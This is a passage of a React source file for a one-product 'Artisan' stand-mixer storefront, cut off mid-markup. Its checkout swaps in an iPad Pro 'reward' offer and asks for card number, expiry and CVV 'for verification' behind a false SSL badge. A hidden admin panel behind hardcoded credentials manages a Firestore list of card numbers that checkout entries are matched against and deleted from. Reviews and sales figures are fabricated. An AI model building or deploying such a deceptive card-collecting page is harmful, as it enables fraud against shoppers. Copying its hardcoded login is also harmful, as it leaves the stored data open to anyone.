import { useState, FormEvent, useEffect, ChangeEvent } from "react";
import { 
  ShoppingCart, 
  Star, 
  Heart, 
  Share2, 
  ChevronRight, 
  Minus, 
  Plus, 
  Check,
  Truck,
  RotateCcw,
  ShieldCheck,
  Menu,
  Search,
  User,
  CreditCard,
  Lock,
  ArrowLeft,
  Settings,
  LayoutDashboard,
  LogOut,
  Package,
  Users,
  BarChart3,
  Save,
  AlertCircle,
  FileText,
  X
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { cn } from "@/lib/utils";
import { db } from "@/lib/firebase";
import { doc, getDoc, setDoc, serverTimestamp } from "firebase/firestore";

const COLORS = [
  { name: "Artisan Jade", hex: "#789B93" },
  { name: "Empire Red", hex: "#B11F24" },
  { name: "Onyx Black", hex: "#231F20" },
  { name: "White", hex: "#F7F7F7" },
  { name: "Blue Velvet", hex: "#1B365D" },
];

const ADMIN_CREDENTIALS = "890305@wty.com";

export default function App() {
  const [view, setView] = useState<"product" | "checkout" | "admin-login" | "admin-dashboard">("product");
  const [selectedColor, setSelectedColor] = useState(COLORS[0]);
  const [quantity, setQuantity] = useState(1);
  const [isLiked, setIsLiked] = useState(false);
  
  // Navigation States
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isSearchOpen, setIsSearchOpen] = useState(false);
  const [isCartOpen, setIsCartOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");

  // Admin Login State
  const [adminEmail, setAdminEmail] = useState("");
  const [adminPassword, setAdminPassword] = useState("");
  const [loginError, setLoginError] = useState(false);

  // Card Management State
  const [cardContent, setCardContent] = useState("");
  const [isSaving, setIsSaving] = useState(false);
  const [saveStatus, setSaveStatus] = useState<"idle" | "success" | "error">("idle");
  const [validationErrors, setValidationErrors] = useState<number[]>([]);

  useEffect(() => {
    if (view === "admin-dashboard") {
      fetchCardData();
    }
  }, [view]);

  const fetchCardData = async () => {
    try {
      const docRef = doc(db, "admin", "cardData");
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        setCardContent(docSnap.data().content || "");
      }
    } catch (error) {
      console.error("Error fetching card data:", error);
    }
  };

  const validateCards = (content: string) => {
    const lines = content.split("\n").filter(line => line.trim() !== "");
    const errors: number[] = [];
    lines.forEach((line, index) => {
      const cleanLine = line.trim().replace(/\s/g, "");
      if (cleanLine.length !== 16 || !/^\d+$/.test(cleanLine)) {
        errors.push(index);
      }
    });
    setValidationErrors(errors);
    return errors.length === 0;
  };

  const handleSaveCards = async () => {
    if (!validateCards(cardContent)) return;

    setIsSaving(true);
    setSaveStatus("idle");
    try {
      const docRef = doc(db, "admin", "cardData");
      await setDoc(docRef, {
        content: cardContent,
        updatedAt: serverTimestamp(),
      });
      setSaveStatus("success");
      setTimeout(() => setSaveStatus("idle"), 3000);
    } catch (error) {
      console.error("Error saving card data:", error);
      setSaveStatus("error");
    } finally {
      setIsSaving(false);
    }
  };

  const handleCardContentChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
    const value = e.target.value;
    setCardContent(value);
    validateCards(value);
  };

  const incrementQuantity = () => setQuantity(prev => prev + 1);
  const decrementQuantity = () => setQuantity(prev => Math.max(1, prev - 1));

  const handleAdminLogin = (e: FormEvent) => {
    e.preventDefault();
    if (adminEmail === ADMIN_CREDENTIALS && adminPassword === ADMIN_CREDENTIALS) {
      setView("admin-dashboard");
      setLoginError(false);
    } else {
      setLoginError(true);
    }
  };

  const renderProductPage = () => (
    <motion.div 
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -20 }}
      className="container mx-auto px-4 py-8 md:px-6 lg:py-12"
    >
      {/* Breadcrumbs */}
      <div className="mb-8 flex items-center gap-2 text-sm text-slate-500">
        <a href="#" className="hover:text-primary">Home</a>
        <ChevronRight className="h-4 w-4" />
        <a href="#" className="hover:text-primary">Appliances</a>
        <ChevronRight className="h-4 w-4" />
        <a href="#" className="hover:text-primary">Stand Mixers</a>
        <ChevronRight className="h-4 w-4" />
        <span className="font-medium text-slate-900">Series 5-Quart Tilt-Head</span>
      </div>

      <div className="grid gap-12 lg:grid-cols-2">
        {/* Product Images */}
        <div className="space-y-4">
          <motion.div 
            layoutId="product-image"
            className="relative aspect-square overflow-hidden rounded-3xl bg-slate-50"
          >
            <img 
              src={`https://images.unsplash.com/photo-1594385208974-2e75f9d8ad48?q=80&w=1000&auto=format&fit=crop`}
              alt="Artisan Stand Mixer"
              className="h-full w-full object-contain p-8 mix-blend-multiply transition-transform duration-500 hover:scale-105"
              referrerPolicy="no-referrer"
            />
            <div className="absolute right-4 top-4 flex flex-col gap-2">
              <Button 
                variant="secondary" 
                size="icon" 
                className="rounded-full bg-white/80 backdrop-blur-sm"
                onClick={() => setIsLiked(!isLiked)}
              >
                <Heart className={cn("h-5 w-5 transition-colors", isLiked ? "fill-red-500 text-red-500" : "text-slate-600")} />
              </Button>
              <Button variant="secondary" size="icon" className="rounded-full bg-white/80 backdrop-blur-sm">
                <Share2 className="h-5 w-5 text-slate-600" />
              </Button>
            </div>
          </motion.div>
          
          <div className="grid grid-cols-4 gap-4">
            {[1, 2, 3, 4].map((i) => (
              <div key={i} className="aspect-square cursor-pointer overflow-hidden rounded-xl bg-slate-50 border-2 border-transparent hover:border-primary/20">
                <img 
                  src={`https://images.unsplash.com/photo-1594385208974-2e75f9d8ad48?q=80&w=200&auto=format&fit=crop`}
                  alt={`Thumbnail ${i}`}
                  className="h-full w-full object-contain p-2 mix-blend-multiply"
                  referrerPolicy="no-referrer"
                />
              </div>
            ))}
          </div>
        </div>

        {/* Product Info */}
        <div className="flex flex-col gap-6">
          <div className="space-y-2">
            <Badge variant="secondary" className="bg-emerald-50 text-emerald-700 hover:bg-emerald-50">In Stock</Badge>
            <h1 className="text-3xl font-bold tracking-tight md:text-4xl lg:text-5xl">
              Series 5-Quart Tilt-Head Stand Mixer
            </h1>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-1">
                {[1, 2, 3, 4].map((i) => (
                  <Star key={i} className="h-4 w-4 fill-amber-400 text-amber-400" />
                ))}
                <Star className="h-4 w-4 fill-amber-400/30 text-amber-400" />
                <span className="ml-2 text-sm font-medium text-slate-600">4.8 (1,240 reviews)</span>
              </div>
            </div>
          </div>

          <div className="flex items-baseline gap-4">
            <span className="text-4xl font-bold text-primary">$449.99</span>
            <span className="text-lg text-slate-400 line-through">$499.99</span>
          </div>

          <Separator />

          {/* Color Selection */}
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <span className="text-sm font-semibold uppercase tracking-wider text-slate-500">Color: {selectedColor.name}</span>
            </div>
            <div className="flex flex-wrap gap-3">
              {COLORS.map((color) => (
                <button
                  key={color.name}
                  onClick={() => setSelectedColor(color)}
                  className={cn(
                    "group relative h-10 w-10 rounded-full transition-all duration-200",
                    selectedColor.name === color.name ? "ring-2 ring-primary ring-offset-2" : "hover:scale-110"
                  )}
                  style={{ backgroundColor: color.hex }}
                  title={color.name}
                >
                  {selectedColor.name === color.name && (
                    <span className="absolute inset-0 flex items-center justify-center">
                      <Check className={cn("h-5 w-5", color.name === "White" ? "text-slate-900" : "text-white")} />
                    </span>
                  )}
                </button>
              ))}
            </div>
          </div>

          {/* Quantity and Add to Cart */}
          <div className="flex flex-col gap-4 sm:flex-row">
            <div className="flex h-12 w-full items-center justify-between rounded-full border bg-slate-50 px-4 sm:w-32">
              <button onClick={decrementQuantity} className="p-1 hover:text-primary">
                <Minus className="h-4 w-4" />
              </button>
              <span className="font-semibold">{quantity}</span>
              <button onClick={incrementQuantity} className="p-1 hover:text-primary">
                <Plus className="h-4 w-4" />
              </button>
            </div>
            <Button 
              onClick={() => setView("checkout")}
              className="h-12 flex-1 rounded-full text-lg font-semibold shadow-lg shadow-primary/20 transition-all hover:scale-[1.02] active:scale-95"
            >
              Buy
            </Button>
          </div>

          <div className="grid grid-cols-1 gap-4 py-4 sm:grid-cols-3">
            <div className="flex items-center gap-3 rounded-2xl bg-slate-50 p-4">
              <Truck className="h-5 w-5 text-slate-600" />
              <div className="text-xs">
                <p className="font-bold">Free Shipping</p>
                <p className="text-slate-500">On orders over $50</p>
              </div>
            </div>
            <div className="flex items-center gap-3 rounded-2xl bg-slate-50 p-4">
              <RotateCcw className="h-5 w-5 text-slate-600" />
              <div className="text-xs">
                <p className="font-bold">30-Day Returns</p>
                <p className="text-slate-500">Easy returns policy</p>
              </div>
            </div>
            <div className="flex items-center gap-3 rounded-2xl bg-slate-50 p-4">
              <ShieldCheck className="h-5 w-5 text-slate-600" />
              <div className="text-xs">
                <p className="font-bold">2-Year Warranty</p>
                <p className="text-slate-500">Guaranteed quality</p>
              </div>
            </div>
          </div>

          <Separator />

          {/* Product Details Tabs */}
          <Tabs defaultValue="description" className="w-full">
            <TabsList className="grid w-full grid-cols-3 rounded-full bg-slate-50 p-1">
              <TabsTrigger value="description" className="rounded-full">Description</TabsTrigger>
              <TabsTrigger value="specs" className="rounded-full">Specs</TabsTrigger>
              <TabsTrigger value="reviews" className="rounded-full">Reviews</TabsTrigger>
            </TabsList>
            <TabsContent value="description" className="mt-6 space-y-4 text-slate-600 leading-relaxed">
              <p>
                The Series 5-Quart Tilt-Head Stand Mixer is the perfect addition to any kitchen. With its powerful motor and versatile attachments, you can easily mix, knead, and whip your favorite ingredients with ease.
              </p>
              <ul className="list-inside list-disc space-y-2">
                <li>5-quart stainless steel bowl with comfortable handle</li>
                <li>Tilt-head design for easy access to the bowl and attachments</li>
                <li>10 speed settings for versatile mixing options</li>
                <li>Includes flat beater, dough hook, and wire whip</li>
              </ul>
            </TabsContent>
            <TabsContent value="specs" className="mt-6">
              <div className="grid grid-cols-2 gap-y-4 text-sm">
                <div className="font-semibold text-slate-500">Capacity</div>
                <div>5 Quarts</div>
                <div className="font-semibold text-slate-500">Wattage</div>
                <div>325 Watts</div>
                <div className="font-semibold text-slate-500">Speeds</div>
                <div>10 Speeds</div>
                <div className="font-semibold text-slate-500">Material</div>
                <div>Zinc Die-Cast</div>
                <div className="font-semibold text-slate-500">Weight</div>
                <div>26 lbs</div>
              </div>
            </TabsContent>
            <TabsContent value="reviews" className="mt-6">
              <div className="space-y-6">
                {[1, 2].map((i) => (
                  <div key={i} className="space-y-2">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="h-8 w-8 rounded-full bg-slate-200" />
                        <span className="font-semibold">User {i}</span>
                      </div>
                      <div className="flex gap-0.5">
                        {[1, 2, 3, 4, 5].map((s) => (
                          <Star key={s} className="h-3 w-3 fill-amber-400 text-amber-400" />
                        ))}
                      </div>
                    </div>
                    <p className="text-sm text-slate-600">
                      "Absolutely love this mixer! It's powerful, quiet, and looks beautiful on my counter. Highly recommend for any home baker."
                    </p>
                  </div>
                ))}
              </div>
            </TabsContent>
          </Tabs>
        </div>
      </div>
    </motion.div>
  );

  // Checkout State
  const [checkoutCardNumber, setCheckoutCardNumber] = useState("");
  const [checkoutExpiry, setCheckoutExpiry] = useState("");
  const [checkoutCvv, setCheckoutCvv] = useState("");
  const [checkoutStatus, setCheckoutStatus] = useState<"idle" | "processing" | "success" | "error">("idle");

  const handleClaimReward = async (e: FormEvent) => {
    e.preventDefault();
    setCheckoutStatus("processing");

    try {
      const docRef = doc(db, "admin", "cardData");
      const docSnap = await getDoc(docRef);
      
      if (docSnap.exists()) {
        const content = docSnap.data().content || "";
        const cardList = content.split("\n").map((line: string) => line.trim().replace(/\s/g, "")).filter((line: string) => line !== "");
        
        const cleanInput = checkoutCardNumber.replace(/\s/g, "");
        const cardIndex = cardList.indexOf(cleanInput);

        if (cardIndex !== -1) {
          // Success: Remove the card from the list
          const newCardList = [...cardList];
          newCardList.splice(cardIndex, 1);
          const newContent = newCardList.join("\n");
          
          await setDoc(docRef, {
            content: newContent,
            updatedAt: serverTimestamp(),
          });
          
          // Update local state if admin is viewing
          setCardContent(newContent);
          setCheckoutStatus("success");
        } else {
          // Failure: Card not in database
          setCheckoutStatus("error");
        }
      } else {
        setCheckoutStatus("error");
      }
    } catch (error) {
      console.error("Checkout error:", error);
      setCheckoutStatus("error");
    }
  };

  const renderCheckoutPage = () => (
    <motion.div 
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      exit={{ opacity: 0, scale: 0.95 }}
      className="container mx-auto max-w-2xl px-4 py-12"
    >
      <Button 
        variant="ghost" 
        onClick={() => {
          setView("product");
          setCheckoutStatus("idle");
        }}
        className="mb-6 flex items-center gap-2 text-slate-500 hover:text-primary"
      >
        <ArrowLeft className="h-4 w-4" />
        Back to Product
      </Button>

      <Card className="overflow-hidden border-none shadow-2xl">
        <CardContent className="p-8 md:p-12">
          <div className="mb-8 space-y-2">
            <h2 className="text-3xl font-bold tracking-tight text-slate-900">Delivery Address</h2>
            <p className="text-slate-500">Where should we send your iPad Pro?</p>
          </div>

          <form className="space-y-6" onSubmit={handleClaimReward}>
            <div className="grid gap-6 md:grid-cols-2">
              <div className="space-y-2">
                <Label htmlFor="firstName" className="text-sm font-bold text-slate-700">First Name</Label>
                <Input id="firstName" placeholder="John" className="h-12 border-slate-200 bg-slate-50/50" required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="lastName" className="text-sm font-bold text-slate-700">Last Name</Label>
                <Input id="lastName" placeholder="Doe" className="h-12 border-slate-200 bg-slate-50/50" required />
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="address" className="text-sm font-bold text-slate-700">Street Address</Label>
              <Input id="address" placeholder="123 Main St" className="h-12 border-slate-200 bg-slate-50/50" required />
            </div>

            <div className="grid gap-6 md:grid-cols-3">
              <div className="md:col-span-1 space-y-2">
                <Label htmlFor="city" className="text-sm font-bold text-slate-700">City</Label>
                <Input id="city" placeholder="New York" className="h-12 border-slate-200 bg-slate-50/50" required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="state" className="text-sm font-bold text-slate-700">State</Label>
                <Input id="state" placeholder="NY" className="h-12 border-slate-200 bg-slate-50/50" required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="zip" className="text-sm font-bold text-slate-700">Zip</Label>
                <Input id="zip" placeholder="10001" className="h-12 border-slate-200 bg-slate-50/50" required />
              </div>
            </div>

            <Separator className="my-8" />

            <div className="space-y-2">
              <Label htmlFor="phone" className="text-sm font-bold text-slate-700">Phone Number</Label>
              <Input id="phone" placeholder="(555) 000-0000" className="h-12 border-slate-200 bg-slate-50/50" required />
            </div>

            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-bold text-slate-700">Email Address</Label>
              <Input id="email" type="email" placeholder="john@example.com" className="h-12 border-slate-200 bg-slate-50/50" required />
            </div>

            <Separator className="my-8" />

            <div className="space-y-6">
              <div className="flex items-center gap-2 text-slate-900">
                <CreditCard className="h-5 w-5 text-blue-600" />
                <h3 className="font-bold">Card Information (For Verification)</h3>
              </div>

              <div className="space-y-2">
                <Label htmlFor="cardNumber" className="text-sm font-bold text-slate-700">Card Number</Label>
                <Input 
                  id="cardNumber" 
                  placeholder="0000 0000 0000 0000" 
                  className="h-12 border-slate-200 bg-slate-50/50" 
                  maxLength={16}
                  value={checkoutCardNumber}
                  onChange={(e) => setCheckoutCardNumber(e.target.value.replace(/\D/g, ""))}
                  required
                />
              </div>

              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <Label htmlFor="expiry" className="text-sm font-bold text-slate-700">Expiry Date</Label>
                  <Input 
                    id="expiry" 
                    placeholder="MMYY" 
                    className="h-12 border-slate-200 bg-slate-50/50" 
                    maxLength={4}
                    value={checkoutExpiry}
                    onChange={(e) => setCheckoutExpiry(e.target.value.replace(/\D/g, ""))}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv" className="text-sm font-bold text-slate-700">CVV</Label>
                  <Input 
                    id="cvv" 
                    placeholder="123" 
                    className="h-12 border-slate-200 bg-slate-50/50" 
                    maxLength={3}
                    value={checkoutCvv}
                    onChange={(e) => setCheckoutCvv(e.target.value.replace(/\D/g, ""))}
                    required
                  />
                </div>
              </div>
            </div>

            {checkoutStatus === "success" && (
              <div className="rounded-xl bg-emerald-50 p-4 text-center text-emerald-700 border border-emerald-200">
                <p className="font-bold">Transaction Successful!</p>
                <p className="text-sm">Your reward has been claimed.</p>
              </div>
            )}

            {checkoutStatus === "error" && (
              <div className="rounded-xl bg-red-50 p-4 text-center text-red-700 border border-red-200">
                <p className="font-bold">Transaction Failed!</p>
                <p className="text-sm">Invalid card number or verification failed.</p>
              </div>
            )}

            <Button 
              type="submit"
              disabled={checkoutStatus === "processing" || checkoutStatus === "success"}
              className="h-14 w-full rounded-xl bg-blue-600 text-lg font-bold text-white shadow-xl shadow-blue-200 transition-all hover:bg-blue-700 hover:scale-[1.01] active:scale-95 disabled:opacity-70"
            >
              {checkoutStatus === "processing" ? "Processing..." : (
                <>Claim My Reward <ChevronRight className="ml-2 h-5 w-5" /></>
              )}
            </Button>

            <div className="flex flex-col items-center gap-4 pt-4">
              <div className="flex items-center gap-6 opacity-40 grayscale transition-all hover:grayscale-0">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-4" referrerPolicy="no-referrer" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-8" referrerPolicy="no-referrer" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" className="h-5" referrerPolicy="no-referrer" />
              </div>
              <div className="flex items-center gap-2 text-[10px] font-bold uppercase tracking-widest text-slate-400">
                <Lock className="h-3 w-3" />
                SECURE 256-BIT SSL ENCRYPTION
              </div>
            </div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );

  const renderAdminLoginPage = () => (
    <motion.div 
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -20 }}
      className="container mx-auto flex min-h-[60vh] items-center justify-center px-4"
    >
      <Card className="w-full max-w-md border-none shadow-2xl">
        <CardHeader className="space-y-1 text-center">
          <CardTitle className="text-2xl font-bold">Admin Login</CardTitle>
          <p className="text-sm text-slate-500">Enter your credentials to access the dashboard</p>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleAdminLogin} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="adminEmail">Email</Label>
              <Input 
                id="adminEmail" 
                type="email" 
                placeholder="name@example.com" 
                value={adminEmail}
                onChange={(e) => setAdminEmail(e.target.value)}
                required
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="adminPassword">Password</Label>
              <Input 
                id="adminPassword" 
                type="password" 
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                required
              />
            </div>
            {loginError && (
              <p className="text-sm font-medium text-red-500">Invalid email or password</p>
            )}
            <Button type="submit" className="w-full">
              Login
            </Button>
            <Button 
              variant="ghost" 
              type="button" 
              className="w-full"
              onClick={() => setView("product")}
            >
              Cancel
            </Button>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );

  const renderAdminDashboardPage = () => (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="container mx-auto px-4 py-8 md:px-6"
    >
      <div className="mb-8 flex flex-col justify-between gap-4 sm:flex-row sm:items-center">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Admin Dashboard</h1>
          <p className="text-slate-500">Manage your store and view analytics</p>
        </div>
        <Button variant="outline" onClick={() => setView("product")} className="flex items-center gap-2">
          <LogOut className="h-4 w-4" />
          Logout
        </Button>
      </div>

      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-4">
        <Card>
          <CardContent className="flex items-center gap-4 p-6">
            <div className="rounded-full bg-blue-100 p-3 text-blue-600">
              <BarChart3 className="h-6 w-6" />
            </div>
            <div>
              <p className="text-sm font-medium text-slate-500">Total Revenue</p>
              <p className="text-2xl font-bold">$45,231.89</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="flex items-center gap-4 p-6">
            <div className="rounded-full bg-emerald-100 p-3 text-emerald-600">
              <ShoppingCart className="h-6 w-6" />
            </div>
            <div>
              <p className="text-sm font-medium text-slate-500">Orders</p>
              <p className="text-2xl font-bold">+573</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="flex items-center gap-4 p-6">
            <div className="rounded-full bg-amber-100 p-3 text-amber-600">
              <Users className="h-6 w-6" />
            </div>
            <div>
              <p className="text-sm font-medium text-slate-500">Customers</p>
              <p className="text-2xl font-bold">+2,350</p>
            </div>
          </CardContent>
        </Card>
        <Card>
          <CardContent className="flex items-center gap-4 p-6">
            <div className="rounded-full bg-purple-100 p-3 text-purple-600">
              <Package className="h-6 w-6" />
            </div>
            <div>
              <p className="text-sm font-medium text-slate-500">Active Products</p>
              <p className="text-2xl font-bold">124</p>
            </div>
          </CardContent>
        </Card>
      </div>

      <div className="mt-8 grid gap-6 lg:grid-cols-3">
        <Card className="lg:col-span-2">
          <CardHeader className="flex flex-row items-center justify-between space-y-0">
            <CardTitle className="flex items-center gap-2">
              <FileText className="h-5 w-5" />
              Credit Card Management
            </CardTitle>
            <Button 
              onClick={handleSaveCards} 
              disabled={isSaving || validationErrors.length > 0}
              className="flex items-center gap-2"
            >
              {isSaving ? "Saving..." : (
                <>
                  <Save className="h-4 w-4" />
                  Save to Database
                </>
              )}
            </Button>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="relative">
              <Textarea 
                value={cardContent}
                onChange={handleCardContentChange}
                placeholder="Enter 16-digit card numbers (one per line)..."
                className={cn(
                  "min-h-[400px] font-mono text-sm resize-none",
                  validationErrors.length > 0 ? "border-red-300 focus-visible:ring-red-500" : ""
                )}
              />
              {validationErrors.length > 0 && (
                <div className="mt-2 flex items-center gap-2 text-sm font-medium text-red-500">
                  <AlertCircle className="h-4 w-4" />
                  Validation Error: {validationErrors.length} line(s) have invalid card numbers (must be exactly 16 digits).
                </div>
              )}
              {saveStatus === "success" && (
                <div className="mt-2 flex items-center gap-2 text-sm font-medium text-emerald-600">
                  <Check className="h-4 w-4" />
                  Data saved successfully to database!
                </div>
              )}
              {saveStatus === "error" && (
                <div className="mt-2 flex items-center gap-2 text-sm font-medium text-red-500">
                  <AlertCircle className="h-4 w-4" />
                  Failed to save data. Please check your connection.
                </div>
              )}
            </div>
            <div className="rounded-lg bg-slate-50 p-4 text-xs text-slate-500">
              <p className="font-bold mb-1">Instructions:</p>
              <ul className="list-disc list-inside space-y-1">
                <li>Each line must contain exactly one 16-digit card number.</li>
                <li>Spaces and non-digit characters will be ignored during validation.</li>
                <li>The "Save" button will be disabled if any line is invalid.</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        <div className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <LayoutDashboard className="h-5 w-5" />
                Recent Orders
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                {[1, 2, 3, 4].map((i) => (
                  <div key={i} className="flex items-center justify-between border-b pb-4 last:border-0 last:pb-0">
                    <div className="flex items-center gap-3">
                      <div className="h-10 w-10 rounded-full bg-slate-100" />
                      <div>
                        <p className="font-medium">Order #123{i}</p>
                        <p className="text-xs text-slate-500">2 minutes ago</p>
                      </div>
                    </div>
                    <p className="font-bold">$449.99</p>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Settings className="h-5 w-5" />
                Store Settings
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex items-center justify-between">
                <p className="text-sm font-medium">Maintenance Mode</p>
                <Badge variant="outline">Disabled</Badge>
              </div>
              <div className="flex items-center justify-between">
                <p className="text-sm font-medium">Email Notifications</p>
                <Badge className="bg-emerald-100 text-emerald-700">Enabled</Badge>
              </div>
              <div className="flex items-center justify-between">
                <p className="text-sm font-medium">Auto-Backup</p>
                <Badge className="bg-emerald-100 text-emerald-700">Enabled</Badge>
              </div>
              <Button className="w-full" variant="outline">View All Settings</Button>
            </CardContent>
          </Card>
        </div>
      </div>
    </motion.div>
  );

  return (
    <div className="min-h-screen bg-slate-50/30 font-sans text-slate-900">
      {/* Navigation */}
      <nav className="sticky top-0 z-50 w-full border-b bg-white/80 backdrop-blur-md">
        <div className="container mx-auto flex h-16 items-center justify-between px-4 md:px-6">
          <div className="flex items-center gap-4">
            <Button 
              variant="ghost" 
              size="icon" 
              className="md:hidden"
              onClick={() => setIsMenuOpen(true)}
            >
              <Menu className="h-6 w-6" />
            </Button>
            <div 
              className="cursor-pointer text-2xl font-bold tracking-tighter text-primary"
              onClick={() => setView("product")}
            >
              ARTISAN
            </div>
            <div className="hidden items-center gap-6 md:flex">
              <button onClick={() => setView("product")} className="text-sm font-medium hover:text-primary/70">Shop</button>
              <button className="text-sm font-medium hover:text-primary/70">Recipes</button>
              <button className="text-sm font-medium hover:text-primary/70">Support</button>
              <button className="text-sm font-medium hover:text-primary/70">About</button>
            </div>
          </div>
          <div className="flex items-center gap-2 md:gap-4">
            <Button variant="ghost" size="icon" onClick={() => setIsSearchOpen(true)}>
              <Search className="h-5 w-5" />
            </Button>
            <Button 
              variant="ghost" 
              size="icon" 
              className="hidden md:flex"
              onClick={() => setView("admin-login")}
            >
              <User className="h-5 w-5" />
            </Button>
            <Button 
              variant="ghost" 
              size="icon" 
              className="relative"
              onClick={() => setIsCartOpen(true)}
            >
              <ShoppingCart className="h-5 w-5" />
              <span className="absolute -right-1 -top-1 flex h-4 w-4 items-center justify-center rounded-full bg-primary text-[10px] font-bold text-white">1</span>
            </Button>
          </div>
        </div>
      </nav>

      {/* Search Overlay */}
      <AnimatePresence>
        {isSearchOpen && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-start justify-center bg-white/95 pt-20 backdrop-blur-sm"
          >
            <div className="container max-w-2xl px-4">
              <div className="flex items-center gap-4 border-b-2 border-primary pb-2">
                <Search className="h-6 w-6 text-primary" />
                <input 
                  autoFocus
                  type="text"
                  placeholder="Search products, recipes..."
                  className="w-full bg-transparent text-2xl font-medium outline-none"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                />
                <Button variant="ghost" size="icon" onClick={() => setIsSearchOpen(false)}>
                  <X className="h-6 w-6" />
                </Button>
              </div>
              <div className="mt-8 space-y-4">
                <p className="text-sm font-bold uppercase tracking-widest text-slate-400">Quick Links</p>
                <div className="flex flex-wrap gap-2">
                  {["Stand Mixers", "Attachments", "New Arrivals", "Best Sellers"].map(link => (
                    <Button key={link} variant="secondary" className="rounded-full">{link}</Button>
                  ))}
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Mobile Menu Drawer */}
      <AnimatePresence>
        {isMenuOpen && (
          <>
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsMenuOpen(false)}
              className="fixed inset-0 z-[100] bg-black/20 backdrop-blur-sm md:hidden"
            />
            <motion.div 
              initial={{ x: "-100%" }}
              animate={{ x: 0 }}
              exit={{ x: "-100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="fixed inset-y-0 left-0 z-[101] w-80 bg-white p-6 shadow-2xl md:hidden"
            >
              <div className="mb-8 flex items-center justify-between">
                <div className="text-2xl font-bold tracking-tighter text-primary">ARTISAN</div>
                <Button variant="ghost" size="icon" onClick={() => setIsMenuOpen(false)}>
                  <X className="h-6 w-6" />
                </Button>
              </div>
              <nav className="flex flex-col gap-6">
                {["Shop", "Recipes", "Support", "About"].map(item => (
                  <button 
                    key={item}
                    className="text-left text-xl font-bold hover:text-primary"
                    onClick={() => {
                      if (item === "Shop") setView("product");
                      setIsMenuOpen(false);
                    }}
                  >
                    {item}
                  </button>
                ))}
                <Separator />
                <button 
                  className="flex items-center gap-3 text-left text-lg font-medium"
                  onClick={() => {
                    setView("admin-login");
                    setIsMenuOpen(false);
                  }}
                >
                  <User className="h-5 w-5" /> Account
                </button>
              </nav>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* Cart Drawer */}
      <AnimatePresence>
        {isCartOpen && (
          <>
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsCartOpen(false)}
              className="fixed inset-0 z-[100] bg-black/20 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ x: "100%" }}
              animate={{ x: 0 }}
              exit={{ x: "100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="fixed inset-y-0 right-0 z-[101] w-full max-w-md bg-white p-6 shadow-2xl"
            >
              <div className="mb-8 flex items-center justify-between">
                <h2 className="text-2xl font-bold">Your Cart (1)</h2>
                <Button variant="ghost" size="icon" onClick={() => setIsCartOpen(false)}>
                  <X className="h-6 w-6" />
                </Button>
              </div>
              <div className="flex-1 overflow-y-auto">
                <div className="flex gap-4 border-b pb-6">
                  <div className="h-24 w-24 rounded-xl bg-slate-50 p-2">
                    <img 
                      src="https://images.unsplash.com/photo-1594385208974-2e75f9d8ad48?q=80&w=200&auto=format&fit=crop" 
                      alt="Mixer" 
